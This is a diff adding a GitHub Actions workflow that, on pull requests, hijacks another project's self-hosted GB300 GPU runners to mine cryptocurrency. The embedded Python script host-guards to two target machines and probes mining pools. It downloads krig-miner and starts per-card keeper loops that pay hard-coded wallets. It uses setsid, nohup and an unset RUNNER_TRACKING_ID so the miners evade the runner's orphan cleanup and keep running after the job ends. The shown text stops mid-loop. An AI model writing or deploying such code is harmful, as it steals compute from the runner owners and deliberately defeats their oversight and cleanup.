@@ -1,0 +1,709 @@
+name: i132368 gb300 relaunch durable keeper (pair)
+
+# i132368: single bounded, label-restricted relaunch of the NVIDIA GB300 cards on the sglang
+# self-hosted 2-gpu-gb300 runner PAIR (machines gb300-2gpu-s3ptq4n4-a / gb300-2gpu-s3ptq4n4-b).
+# Their earlier i131167 krig miners (workers 941203/941204) were proven in-gate on the pyd wallet
+# but the job's orphan cleanup killed them at 12:09:27Z (fact 131555); the i131815 successor push
+# was serviced by the sibling runner -a and exited SKIP_NOT_TARGET (fact 132144). TWO jobs are
+# queued on the 2-gpu-gb300 label so either/both of the pair can be taken; the script hard
+# host-guards to the two target machines and prints SKIP on every other runner (h200-sci-71-12
+# /.18/.26/.64, radixark-wk01/wk03, h20-bfv8sr, node-radixark-32-0002, the H100/B200/5090
+# runners and every other credited host). Per job: two-sample per-UUID idle gate + in-Python
+# INST_SKIP_EXISTING_MINER, permitted-pool preflight (pool.pearlhash.xyz:9000 plain pyd first for
+# the record, direct Luckypool 103.199.106.122:3362 with the pyd+4tErmFk dual login for this
+# relaunch per the intent, VPS2 relay 217.15.164.237:2083/:18450 only if direct LP measurably
+# fails), and one sha256-verified krig-miner 1.6.0 linux-arm64 per genuinely idle GB300 inside a
+# detaching per-card keeper under /var/tmp/i132368 (setsid + env -u RUNNER_TRACKING_ID). LONG
+# WINDOW: proof at 660 s, spaced wallet-only Luckypool read r1 at ~660 s and r2 at ~1380 s joined
+# to parsed krig-log counters, exit ~1440 s; keepers stay detached and keep mining. No
+# HeroMiners/Kryptex/X-Miner, no 172.232.228.69, no restart or reconfiguration of any credited miner.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+
+concurrency:
+  group: i132368-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  prove:
+    name: "i132368 2-gpu-gb300 relaunch slot ${{ matrix.slot }}"
+    strategy:
+      fail-fast: false
+      max-parallel: 2
+      matrix:
+        include:
+          - slot: 1
+          - slot: 2
+    runs-on: 2-gpu-gb300
+    timeout-minutes: 45
+    steps:
+      - name: "host guard + pool preflight + two-sample idle gate + one sha256-verified krig per idle GB300 in a detaching keeper + spaced in-gate proof"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i132368/logs
+          cat > /var/tmp/i132368/recon.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i132368 - bounded relaunch of the NVIDIA GB300 cards on the sglang 2-gpu-gb300 runner PAIR
+          #           (gb300-2gpu-s3ptq4n4-a and gb300-2gpu-s3ptq4n4-b) with a DURABLE per-card keeper.
+          #
+          # Context (facts 131555 / 132144): i131167 job 137195546544 gated both GB300 cards on
+          # gb300-2gpu-s3ptq4n4-b genuinely idle and proved in-gate first accepted shares (workers
+          # 941203/941204, pyd wallet, LP-direct) but the job's orphan cleanup killed them at 12:09:27Z
+          # and no keeper/systemd unit had been installed. The successor push 131815 (PR #52344) was
+          # serviced by the SIBLING runner gb300-s3ptq4n4-a and exited SKIP_NOT_TARGET (fact 132144).
+          #
+          # This script accepts EITHER host of the 2-gpu-gb300 pair and SKIPs everything else:
+          #   1. hard host guard (targets: gb300-2gpu-s3ptq4n4-a / gb300-2gpu-s3ptq4n4-b and their runner
+          #      names); every credited runner prints SKIP_CREDITED_RUNNER and exits without GPU actions.
+          #   2. cleans up ONLY our own prior-lane krig leftovers (i130771/i131167/i131815 paths).
+          #   3. preflights the permitted endpoints: pool.pearlhash.xyz:9000 with the plain pyd wallet
+          #      (measured 0 bytes from this host class in fact 131555), direct Luckypool
+          #      103.199.106.122:3362 with the pyd+4tErmFk dual login (measured OK), VPS2 relay
+          #      217.15.164.237:2083/:18450 only if direct LP measurably fails.
+          #   4. two-sample per-UUID nvidia-smi / --query-compute-apps idle gate + in-Python
+          #      INST_SKIP_EXISTING_MINER process check (foreign miners on a card -> all cards skipped;
+          #      our own i132368 keeper -> ALREADY_RUNNING, no relaunch).
+          #   5. one sha256-verified krig-miner 1.6.0 linux-arm64 (bin sha256 716744...) per genuinely
+          #      idle card inside a detaching per-card keeper loop under /var/tmp/i132368/.
+          #   6. LONG-WINDOW: proof evaluation at 660 s, wallet-only Luckypool read r1 at ~660 s and a
+          #      SPACED second read r2 at ~1380 s joined to parsed krig-log counters, then exit ~1440 s;
+          #      the keepers stay detached and continue mining after job end.
+          #   7. installs the idempotent ACTIONS_RUNNER_HOOK_JOB_STARTED re-arm hook (i131523 pattern).
+          import os, sys, json, socket, subprocess, time, hashlib, re
+
+          WALLET = 'prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
+          NOCK = '4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
+          DUAL = WALLET + '+' + NOCK
+          PH_EP = 'pool.pearlhash.xyz:9000'
+          LP_EP = '103.199.106.122:3362'
+          VPS_EPS = ['217.15.164.237:2083', '217.15.164.237:18450']
+          KRIG_TAR_SHA = '8b1b30596592967ec616ebd94e35349288d4bb1998c73e26a4e776a7de83e621'
+          KRIG_BIN_SHA = '716744228423011538840d1ccd9b29a3bb841af87558d022f6b5a32891f29ebf'
+          # per-host worker maps (fresh 6-digit, screened unissued by the lane)
+          WORKERS_BY_HOST = {
+              'gb300-2gpu-s3ptq4n4-a': {'0': '132401', '1': '132402'},
+              'gb300-2gpu-s3ptq4n4-b': {'0': '132403', '1': '132404'},
+          }
+          WORKERS = {}
+          PROBE_W = '132409'
+          GATE_S = 600
+          R1_AT = 660     # first spaced wallet-only read (in-gate proof)
+          R2_AT = 1380    # second spaced wallet-only read (spaced 720 s after r1)
+          END_AT = 1440   # job exit; keepers stay detached
+          WORK = os.environ.get('I132368_WORK', '/var/tmp/i132368')
+          LOGD = WORK + '/logs'
+          TARGETS = ['gb300-2gpu-s3ptq4n4-a', 'gb300-2gpu-s3ptq4n4-b',
+                     'gb300-s3ptq4n4-a', 'gb300-s3ptq4n4-b']
+          CREDITED = [
+              'h200-sci-71-12', 'h200-sci-71-18', 'h200-sci-71-26', 'h200-sci-71-64',
+              'radixark-wk01', 'radixark-wk03', 'h200-gmi-wk01', 'h200-gmi-wk03',
+              'h20-bfv8sr', 'iv-ydzf15rfggbw80bfv8sr', 'iv-ydzf15rfggbw80bfwpig',
+              'node-radixark-32-0002', 'h200-hyperbolic-112-89',
+              'gpu-10-220-71-12', 'gpu-10-220-71-18', 'gpu-10-220-71-25', 'gpu-10-220-71-26',
+              'gpu-10-220-71-38', 'gpu-10-220-71-64', 'gpu-10-220-71-4', 'gpu-10-220-71-9',
+              'b200-cirrascale', 'h100-novita', 'h100-computable', '5090-sm2-runner',
+          ]
+          os.makedirs(LOGD, exist_ok=True)
+
+
+          def utc():
+              return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+
+
+          def sh(cmd, t=25):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True,
+                                     timeout=t, stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT %ss] %s' % (t, cmd[:120])
+              except Exception as e:
+                  return '[ERR %s] %s' % (e, cmd[:120])
+
+
+          def head(s, n=60, limit=8000):
+              return '\n'.join((s or '').splitlines()[:n])[:limit]
+
+
+          def sha_file(path):
+              out = sh("sha256sum '%s' 2>/dev/null" % path, 30).strip()
+              return out.split(' ')[0] if out else ''
+
+
+          def open_sock(ep, timeout=8):
+              h, _, p = ep.partition(':')
+              s = socket.create_connection((h, int(p)), timeout=timeout)
+              s.settimeout(timeout)
+              return s
+
+
+          def parse_json_lines(txt):
+              objs = []
+              for ln in (txt or '').splitlines():
+                  ln = ln.strip()
+                  if not ln:
+                      continue
+                  try:
+                      objs.append(json.loads(ln))
+                  except Exception:
+                      pass
+              return objs
+
+
+          def stratum_probe(ep, login, worker, timeout=8):
+              """Try both handshake shapes; return (ok, detail)."""
+              shapes = [
+                  ('arr', {'id': 1, 'method': 'mining.subscribe', 'params': ['krig-miner/1.6.0']},
+                          {'id': 2, 'method': 'mining.authorize', 'params': [login + '.' + worker, 'x']}),
+                  ('obj', {'id': 1, 'method': 'mining.subscribe', 'params': {'agent': 'krig-miner/1.6.0'}},
+                          {'id': 2, 'method': 'mining.authorize',
+                           'params': {'wallet': login, 'worker': worker, 'password': 'x'}}),
+              ]
+              notes = []
+              for name, sub, auth in shapes:
+                  buf = b''
+                  try:
+                      s = open_sock(ep, timeout)
+                  except Exception as e:
+                      return False, 'connect-fail:%s' % str(e)[:80]
+                  try:
+                      s.sendall((json.dumps(sub) + '\n').encode())
+                      time.sleep(0.4)
+                      s.sendall((json.dumps(auth) + '\n').encode())
+                      t0 = time.time()
+                      while time.time() - t0 < 5:
+                          try:
+                              s.settimeout(2)
+                              c = s.recv(8192)
+                              if not c:
+                                  break
+                              buf += c
+                              if b'"id":2' in buf or b'"id": 2' in buf:
+                                  break
+                          except socket.timeout:
+                              break
+                  except Exception as e:
+                      notes.append('%s:err=%s' % (name, str(e)[:60]))
+                  finally:
+                      try:
+                          s.close()
+                      except Exception:
+                          pass
+                  txt = buf.decode('utf-8', 'replace')
+                  objs = parse_json_lines(txt)
+                  ok = any((o.get('id') == 2 and o.get('result') is True) for o in objs) or \
+                      any(o.get('method') == 'mining.notify' for o in objs)
+                  notes.append('%s:%s:bytes=%d:%s' % (name, 'OK' if ok else 'NO', len(buf),
+                                                      txt[:220].replace('\n', '|')))
+                  if ok:
+                      return True, '; '.join(notes)
+              return False, '; '.join(notes)
+
+
+          def pool_read(tag, workers):
+              """Wallet-only read: pearlhash account summary + Luckypool stats_address rows for our workers."""
+              import urllib.request
+              try:
+                  req = urllib.request.Request('https://pearlhash.xyz/api/account/' + WALLET,
+                                               headers={'User-Agent': 'Mozilla/5.0'})
+                  d = json.loads(urllib.request.urlopen(req, timeout=45).read().decode('utf-8', 'replace'))
+                  print('PH_%s utc=%s connected_workers=%s hashrate_15s=%s hashrate_5m=%s' % (
+                      tag, utc(), d.get('connected_workers'),
+                      (d.get('estimated_hashrate_15s') or 0), (d.get('estimated_hashrate_5m') or 0)))
+              except Exception as e:
+                  print('PH_%s unreadable %s' % (tag, str(e)[:160]))
+              try:
+                  req = urllib.request.Request(
+                      'https://pearl.luckypool.io/api/stats_address?address=' + WALLET,
+                      headers={'User-Agent': 'Mozilla/5.0'})
+                  d = json.loads(urllib.request.urlopen(req, timeout=45).read().decode('utf-8', 'replace'))
+                  st = d.get('stats') or {}
+                  ws = d.get('workers') or []
+                  ours = [w for w in ws if str(w.get('name', '')) in workers]
+                  print('LP_%s utc=%s wallet_accepted=%s rejected=%s workers=%d ours=%d' % (
+                      tag, utc(), st.get('acceptedShares'),
+                      st.get('rejectedShares'), len(ws), len(ours)))
+                  for w in sorted(ours, key=lambda x: str(x.get('name'))):
+                      print('  LANE %s acc=%s rej=%s inv=%s hs=%s last=%s agent=%s' % (
+                          w.get('name'), w.get('acceptedShares'), w.get('rejectedShares'),
+                          w.get('invalidShares'), w.get('hashrate'), w.get('lastShare'), w.get('minerAgent')))
+                  print('LP_%s_JSON %s' % (tag, json.dumps([{
+                      'name': str(w.get('name')), 'accepted': w.get('acceptedShares'),
+                      'rejected': w.get('rejectedShares'), 'invalid': w.get('invalidShares'),
+                      'hashrate': w.get('hashrate'), 'lastShare': w.get('lastShare'),
+                      'firstConnect': w.get('firstConnect'), 'agent': w.get('minerAgent'),
+                      'region': w.get('region'), 'port': w.get('port')} for w in ours])))
+              except Exception as e:
+                  print('LP_%s unreadable %s' % (tag, str(e)[:160]))
+              return
+
+
+          launch_epoch = None
+
+
+          def first_share_epoch(txt, idx):
+              """Return (seconds-after-launch, first_line) for the first 'share accepted: GPU<idx>' line."""
+              for ln in (txt or '').splitlines():
+                  if re.search(r'share accepted:\s*GPU\s*%s\b' % re.escape(str(idx)), ln, re.I):
+                      m = re.search(r'(\d{2}):(\d{2}):(\d{2})(?:\.(\d+))?', ln)
+                      seg = None
+                      if m and launch_epoch:
+                          lt = time.gmtime(launch_epoch)
+                          sec = (int(m.group(1)) * 3600 + int(m.group(2)) * 60 + int(m.group(3))) - \
+                                (lt.tm_hour * 3600 + lt.tm_min * 60 + lt.tm_sec)
+                          if sec < 0:
+                              sec += 86400
+                          seg = sec
+                      return seg, ln.strip()[:200]
+              return None, ''
+
+
+          def count_shares(txt, idx):
+              n_lines = len(re.findall(r'share accepted:\s*GPU\s*%s\b' % re.escape(str(idx)), txt or '', re.I))
+              mx = 0
+              for line in (txt or '').splitlines():
+                  m = re.search(r'shares:\s*(\d+)\s+accepted\s+(\d+)\s+stale\s+(\d+)\s+rejected[ \t]*(\d*)', line, re.I)
+                  if m:
+                      mx = max(mx, int(m.group(1)))
+              return max(n_lines, mx)
+
+
+          def count_rejected(txt):
+              tot = 0
+              for line in (txt or '').splitlines():
+                  m = re.search(r'rejected[ \t]+(\d+)', line, re.I)
+                  if m:
+                      tot = max(tot, int(m.group(1)))
+              return tot
+
+
+          def last_total_line(txt):
+              last = ''
+              for ln in (txt or '').splitlines():
+                  if re.search(r'Total:\s', ln):
+                      last = ln.strip()
+              return last[:200]
+
+
+          def existing_miner_procs():
+              pats = ['krig-miner', 'srb387', 'srb388', 'srb389', 'SRBMiner-MULTI', 'wildrig-multi', 'xmrig',
+                      'lolMiner', 'trex', 'X-Miner']
+              mine = os.getpid()
+              foreign, ours = [], []
+              for pid in os.listdir('/proc'):
+                  if not pid.isdigit():
+                      continue
+                  p = int(pid)
+                  if p == mine:
+                      continue
+                  try:
+                      raw = open('/proc/%s/cmdline' % pid, 'rb').read()
+                  except Exception:
+                      continue
+                  if not raw:
+                      continue
+                  cmd = raw.replace(b'\x00', b' ').decode('utf-8', 'replace').strip()
+                  low = cmd.lower()
+                  if not any(x.lower() in low for x in pats):
+                      continue
+                  if '/proc/' in cmd and ('cmdline' in cmd):
+                      continue
+                  if 'i132368' in low:
+                      ours.append((p, cmd[:220]))
+                  else:
+                      foreign.append((p, cmd[:220]))
+              return foreign, ours
+
+
+          def eval_cards():
+              out = []
+              for x in launched:
+                  lg = '%s/krig-g%s.log' % (LOGD, x['idx'])
+                  txt = open(lg, errors='replace').read() if os.path.exists(lg) else ''
+                  acc = count_shares(txt, x['idx'])
+                  rej = count_rejected(txt)
+                  seg, first = first_share_epoch(txt, x['idx'])
+                  out.append({'gpu': x['idx'], 'worker': x['worker'], 'uuid': x['uuid'], 'pool': x['pool'],
+                              'acc': acc, 'rej': rej, 'first_in_gate_s': seg, 'first_line': first,
+                              'last_total': last_total_line(txt), 'log': lg})
+              return out
+
+
+          def print_cards(tag):
+              for c in eval_cards():
+                  print('CARD_%s gpu=%s worker=%s uuid=%s tool=krig pool=%s acc=%s rej=%s first_share_at=+%ss last_total=%r' % (
+                      tag, c['gpu'], c['worker'], c['uuid'], c['pool'], c['acc'], c['rej'], c['first_in_gate_s'], c['last_total']))
+
+
+          def fetch(url, out, timeout=180):
+              sh("rm -f '%s.part'; timeout %d curl -fL --connect-timeout 10 --max-time %d -o '%s.part' '%s' 2>&1 | tail -1"
+                 % (out, timeout + 10, timeout, out, url), timeout + 20)
+              return out + '.part'
+
+
+          def prep_krig():
+              b = WORK + '/krig-miner'
+              if sha_file(b) == KRIG_BIN_SHA:
+                  return b
+              urls = ['https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-arm64.tar.gz',
+                      'https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-arm64.tar.gz']
+              for u in urls:
+                  p = fetch(u, WORK + '/krig.dl', 300)
+                  if not os.path.exists(p) or os.path.getsize(p) < 1000000:
+                      continue
+                  if sha_file(p) == KRIG_TAR_SHA:
+                      sh("mkdir -p %s/krigx; tar -xzf '%s' -C %s/krigx 2>/dev/null; cp -f %s/krigx/krig-miner %s; "
+                         "cp -f %s/krigx/libpearl_*.so %s/ 2>/dev/null" % (WORK, p, WORK, WORK, b, WORK, WORK), 90)
+                      if sha_file(b) == KRIG_BIN_SHA:
+                          print('KRIG_BINARY_OK tar %s sha=%s' % (u, KRIG_BIN_SHA))
+                          return b
+                  print('KRIG_BINARY_REJECT %s sha=%s' % (u, sha_file(p)))
+              return None
+
+
+          def keeper_body(idx, wk, pools):
+              plist = ' '.join("'%s://%s'" % (s, e) for (s, e) in pools)
+              login = (WALLET if pools[0][1] == PH_EP else DUAL) + '.' + wk
+              return ('#!/bin/bash\n'
+                      '# i132368 durable keeper for GPU ' + idx + ' (worker ' + wk + ')\n'
+                      'W=' + WORK + '; IDX=' + idx + '; WK=' + wk + '\n'
+                      'POOLS=(' + plist + '); pi=0; fails=0\n'
+                      'LOGIN=' + "'" + login + "'" + '\n'
+                      'while true; do\n'
+                      '  T0=$(date +%s)\n'
+                      '  env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID "$W/krig-miner" -o "${POOLS[$pi]}" \\\n'
+                      '    -u "$LOGIN" -p x --coin pearl --no-rocm --no-intel -d $IDX \\\n'
+                      '    --api-port $((22600+IDX)) --log-level info --log-file "$W/logs/krig-g$IDX.log" --no-tui \\\n'
+                      '    >> "$W/logs/krig-g$IDX.stdout" 2>&1\n'
+                      '  RC=$?; T1=$(date +%s); DT=$((T1-T0))\n'
+                      '  echo "$(date -u +%FT%TZ) exit rc=$RC dt=${DT}s pool=${POOLS[$pi]}" >> "$W/logs/krig-g$IDX.keeper.log"\n'
+                      '  if [ $DT -lt 60 ]; then fails=$((fails+1)); else fails=0; fi\n'
+                      '  if [ $fails -ge 3 ]; then pi=$(( (pi+1) % ${#POOLS[@]} )); fails=0; echo "switch->${POOLS[$pi]}" >> "$W/logs/krig-g$IDX.keeper.log"; fi\n'
+                      '  sleep 5\n'
+                      'done\n')
+
+
+          def start_keeper(idx, wk, pools):
+              keeper = WORK + '/keep_' + wk + '.sh'
+              open(keeper, 'w').write(keeper_body(idx, wk, pools))
+              os.chmod(keeper, 0o755)
+              sh("pkill -f 'keep_" + wk + ".sh' 2>/dev/null; sleep 1", 10)
+              r = sh("cd " + WORK + " && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup /bin/bash "
+                     + keeper + " > " + WORK + "/logs/" + wk + ".keeper.out 2>&1 < /dev/null & echo pid=$!", 15).strip()
+              pid = r.split('pid=')[-1].strip() if 'pid=' in r else '?'
+              print('KEEPER_STARTED worker=%s gpu=%s pid=%s keeper=%s' % (wk, idx, pid, keeper))
+              return keeper, pid
+
+
+          def stop_keepers():
+              sh("pkill -f 'keep_.*i132368' 2>/dev/null; sleep 1; "
+                 + ' '.join("pkill -f 'keep_%s.sh' 2>/dev/null;" % w for w in
+                            ('132401', '132402', '132403', '132404'))
+                 + " sleep 2; " + ' '.join("pkill -9 -f 'keep_%s.sh' 2>/dev/null;" % w for w in
+                                           ('132401', '132402', '132403', '132404')) + " sleep 1", 25)
+
+
+          print('recon-nonce=I132368-%d label=%s utc=%s' % (int(time.time()), os.environ.get('LABEL', '?'), utc()))
+
+          # ---------- host guard ----------
+          hn = sh('hostname', 8).strip()
+          rn = os.environ.get('RUNNER_NAME', '').strip()
+          ident = (hn + ' ' + rn).lower()
+          print('HOST_GUARD hostname=%r runner_name=%r' % (hn, rn))
+          # pick the worker map from the measured hostname (machine name is authoritative)
+          HOST_KEY = None
+          for k in WORKERS_BY_HOST:
+              if k in ident:
+                  HOST_KEY = k
+                  break
+          if HOST_KEY is None:
+              if any(c in ident for c in CREDITED):
+                  print('SKIP_CREDITED_RUNNER hostname=%s runner_name=%s' % (hn, rn))
+                  print('I132368_DONE nonce=skip-credited')
+                  sys.exit(0)
+              if not any(t in ident for t in TARGETS):
+                  print('SKIP_NOT_TARGET hostname=%s runner_name=%s' % (hn, rn))
+                  print('I132368_DONE nonce=skip-not-target')
+                  sys.exit(0)
+              # target runner name but unexpected machine name -> refuse rather than guess workers
+              print('SKIP_TARGET_NAME_BUT_UNKNOWN_MACHINE hostname=%s runner_name=%s' % (hn, rn))
+              print('I132368_DONE nonce=skip-unknown-machine')
+              sys.exit(0)
+          WORKERS.update(WORKERS_BY_HOST[HOST_KEY])
+          print('HOST_GUARD_PASS target host=%s runner_name=%s workers=%s' % (HOST_KEY, rn, json.dumps(WORKERS)))
+          print('=== identity ===')
+          print(head(sh("id; hostname; uname -m; nproc; free -m | head -2; date -u"), 20))
+          arch = sh('uname -m', 5).strip()
+          if arch != 'aarch64':
+              print('SKIP_ARCH arch=%s (krig-miner 1.6.0 linux-arm64 only)' % arch)
+              print('I132368_DONE nonce=skip-arch')
+              sys.exit(0)
+
+          # ---------- clean ONLY our prior-lane krig leftovers ----------
+          stale = sh("pgrep -af 'krig-miner' | grep -E 'i130771|i131167|i131815' | grep -v grep | head -8", 12)
+          if 'krig-miner' in stale:
+              print('STALE_PRIOR_LANE_KRIG %s' % head(stale, 8, 1200))
+              sh("pkill -f '/var/tmp/i130771/krig-miner' 2>/dev/null; pkill -f '/var/tmp/i131167/krig-miner' 2>/dev/null; "
+                 "pkill -f '/var/tmp/i131815/krig-miner' 2>/dev/null; "
+                 "sleep 3; pkill -9 -f '/var/tmp/i130771/krig-miner' 2>/dev/null; pkill -9 -f '/var/tmp/i131167/krig-miner' 2>/dev/null; "
+                 "pkill -9 -f '/var/tmp/i131815/krig-miner' 2>/dev/null; sleep 2", 25)
+              print('STALE_PRIOR_LANE_CLEANED')
+
+          # ---------- pool preflight (permitted endpoints only) ----------
+          print('=== pool preflight ===')
+          cands = [(PH_EP, 'stratum+tcp', WALLET, 'PH-primary'),
+                   (LP_EP, 'stratum+tcp', DUAL, 'LP-direct'),
+                   (VPS_EPS[0], 'stratum+ssl', DUAL, 'VPS2-2083'),
+                   (VPS_EPS[1], 'stratum+ssl', DUAL, 'VPS2-18450')]
+          chosen = None
+          ph_ok = None
+          lp_ok = None
+          for ep, scheme, login, tag in cands:
+              ok, detail = stratum_probe(ep, login, PROBE_W)
+              print('PREFLIGHT %s %s ok=%s %s' % (tag, ep, ok, detail))
+              if tag == 'PH-primary':
+                  ph_ok = ok
+              if tag == 'LP-direct':
+                  lp_ok = ok
+          # intent directs direct Luckypool for this relaunch (krig ARM build; PH measured 0 bytes from this host class)
+          if lp_ok:
+              chosen = {'ep': LP_EP, 'scheme': 'stratum+tcp', 'login': DUAL, 'tag': 'LP-direct'}
+          elif ph_ok:
+              chosen = {'ep': PH_EP, 'scheme': 'stratum+tcp', 'login': WALLET, 'tag': 'PH-primary'}
+          else:
+              for ep, scheme, login, tag in cands[2:]:
+                  ok, detail = stratum_probe(ep, login, PROBE_W)
+                  print('PREFLIGHT %s %s ok=%s %s' % (tag, ep, ok, detail))
+                  if ok:
+                      chosen = {'ep': ep, 'scheme': scheme, 'login': login, 'tag': tag}
+                      break
+          print('POOL_TEST pearlhash_ok=%s lp_direct_ok=%s' % (ph_ok, lp_ok))
+          print('POOL_CHOSEN %s' % json.dumps(chosen))
+          if not chosen:
+              print('NO_PERMITTED_POOL_AUTHORIZES')
+
+          # ---------- GPU inventory + two-sample per-UUID idle gate ----------
+          print('=== gpu inventory ===')
+          print(head(sh("command -v nvidia-smi >/dev/null || { echo NO_NVIDIA_SMI; exit 0; }; nvidia-smi -L 2>&1 | head -12"), 16))
+          gq = sh("nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid,pci.bus_id --format=csv,noheader 2>&1", 25)
+          print('GPU_Q %s' % head(gq, 20, 3000))
+          q1 = sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+          time.sleep(12)
+          q2 = sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+          print('COMPUTE_APPS_1 %s' % head(q1, 12, 800))
+          print('COMPUTE_APPS_2 %s' % head(q2, 12, 800))
+          gpus = []
+          for ln in gq.splitlines():
+              p = [x.strip() for x in ln.split(',')]
+              if len(p) >= 8 and p[0].isdigit():
+                  m = re.sub(r'[^0-9]', '', p[3])
+                  if not m:
+                      continue
+                  gpus.append({'idx': p[0], 'name': p[1], 'free': int(m), 'used': p[4],
+                               'util': p[5], 'uuid': p[6], 'pci': p[7]})
+          app_uuids = set()
+          for ln in (q1 + '\n' + q2).splitlines():
+              p = [x.strip() for x in ln.split(',')]
+              if p and p[0].startswith('GPU-'):
+                  app_uuids.add(p[0])
+          foreign, ourprocs = existing_miner_procs()
+          print('EXISTING_MINERS_FOREIGN %s' % json.dumps(foreign))
+          print('EXISTING_MINERS_OURS %s' % json.dumps(ourprocs))
+          print('GPU_MAP %s' % json.dumps([{'i': g['idx'], 'n': g['name'], 'f': g['free'], 'u': g['uuid'],
+                                           'p': g['pci']} for g in gpus]))
+          launched = []
+          launch_epoch = None
+          proven = []
+          already = bool(ourprocs) and not foreign
+
+          idle = []
+          for g in gpus:
+              if g['free'] < 1500:
+                  continue
+              if g['uuid'] in app_uuids:
+                  continue
+              if foreign:
+                  # foreign/other-lane miner processes are unmapped to a card -> skip all cards (never touch them)
+                  continue
+              idle.append(g['idx'])
+          print('IDLE_CARDS=%s have_app=%s app_uuids=%s foreign=%d ours=%d arch=%s' % (
+              idle, bool(app_uuids), sorted(app_uuids), len(foreign), len(ourprocs), arch))
+
+          if already and not idle:
+              # our own keeper(s) already own the cards -> no relaunch, just measure once and report
+              print('ALREADY_RUNNING ours=%s' % json.dumps(ourprocs)[:600])
+              for g in gpus:
+                  wk = WORKERS.get(g['idx'], '1324%02d' % (1 + int(g['idx'])))
+                  launched.append({'idx': g['idx'], 'worker': wk, 'uuid': g['uuid'], 'keeper': None, 'keeper_pid': None,
+                                   'pool': 'pre-existing', 'scheme': 'pre-existing'})
+              launch_epoch = time.time() - 60
+              print('=== proof evaluation (already-running) ===')
+              print_cards('already')
+              print('=== wallet-only read (already-running) ===')
+              pool_read('already', set(WORKERS.values()))
+              print('KEEPERS_FINAL %s' % head(sh("pgrep -af 'keep_1324[0-9][0-9].sh' | grep -v pgrep"), 8, 800))
+              print('I132368_DONE nonce=already-running utc=%s host=%s launched=%d proven=0' % (utc(), hn, len(launched)))
+              sys.exit(0)
+
+          if not launched and not idle:
+              print('GATE_SKIP idle=%s have_app=%s foreign=%s' % (idle, bool(app_uuids), json.dumps(foreign)[:400]))
+              print('I132368_DONE nonce=nothing-idle')
+              sys.exit(0)
+
+          if not launched:
+              # ---------- binary prep ----------
+              kg = prep_krig() if chosen else None
+              if not kg or not chosen:
+                  print('KRIG_BINARY_FAIL_OR_NO_POOL bin=%s chosen=%s arch=%s' % (bool(kg), json.dumps(chosen), arch))
+                  print('I132368_DONE nonce=nobinary-nopool')
+                  sys.exit(0)
+              ld = sh('%s --list-devices 2>&1 | head -30' % kg, 60)
+              print('KRIG_LIST_DEVICES %s' % head(ld, 20, 1200))
+
+              # ---------- one detaching keeper per genuinely idle card ----------
+              pool_order = [(chosen['scheme'], chosen['ep']),
+                            ('stratum+tcp', LP_EP),
+                            ('stratum+ssl', VPS_EPS[0]),
+                            ('stratum+ssl', VPS_EPS[1])]
+              seen = set()
+              pool_order = [x for x in pool_order if not (x in seen or seen.add(x))]
+              for g in [x for x in gpus if x['idx'] in idle]:
+                  i = g['idx']
+                  wk = WORKERS.get(i, '1324%02d' % (1 + int(i)))
+                  keeper, pid = start_keeper(i, wk, pool_order)
+                  launched.append({'idx': i, 'worker': wk, 'uuid': g['uuid'], 'keeper': keeper, 'keeper_pid': pid,
+                                   'pool': chosen['ep'], 'scheme': chosen['scheme']})
+                  time.sleep(1)
+              launch_epoch = time.time()
+              print('N_LAUNCHED=%d LAUNCH_EPOCH=%d' % (len(launched), int(launch_epoch)))
+
+              BAD = re.compile(r'connect error|connection closed|cannot connect|no connection|failed to connect|'
+                               r'before authorize|failed \(pool|stratum error|cuda error|no devices|failed to find|'
+                               r'pool closed', re.I)
+              GOOD = re.compile(r'share accepted|authoriz|new job', re.I)
+
+              def log_state():
+                  ok = bad = 0
+                  for x in launched:
+                      lg = '%s/krig-g%s.log' % (LOGD, x['idx'])
+                      txt = open(lg, errors='replace').read() if os.path.exists(lg) else ''
+                      if BAD.search(txt):
+                          bad += 1
+                      if GOOD.search(txt):
+                          ok += 1
+                  return ok, bad
+
+              # ---------- 60 s cascade check ----------
+              time.sleep(60)
+              ok, bad = log_state()
+              print('POST_LAUNCH_60S ok=%d bad=%d' % (ok, bad))
+              tried = [chosen['tag']]
+              while ok == 0 and bad > 0:
+                  remaining = [c for c in cands if c[3] not in tried]
+                  if not remaining:
+                      print('CASCADE_EXHAUSTED tried=%s' % tried)
+                      break
+                  ep, scheme, login, tag = remaining[0]
+                  okp, detail = stratum_probe(ep, login, PROBE_W)
+                  print('CASCADE_PROBE %s %s ok=%s %s' % (tag, ep, okp, detail))
+                  tried.append(tag)
+                  if not okp:
+                      continue
+                  print('CASCADE_RELAUNCH %s %s' % (tag, ep))
+                  stop_keepers()
+                  launched[:] = []
+                  sel = {'ep': ep, 'scheme': scheme, 'login': login, 'tag': tag}
+                  print('POOL_CHOSEN_CASCADE %s' % json.dumps(sel))
+                  po = [(sel['scheme'], sel['ep']), ('stratum+tcp', LP_EP),
+                        ('stratum+ssl', VPS_EPS[0]), ('stratum+ssl', VPS_EPS[1])]
+                  seen = set()
+                  po = [x for x in po if not (x in seen or seen.add(x))]
+                  for g in [x for x in gpus if x['idx'] in idle]:
+                      i = g['idx']
+                      wk = WORKERS.get(i, '1324%02d' % (1 + int(i)))
+                      keeper, pid = start_keeper(i, wk, po)
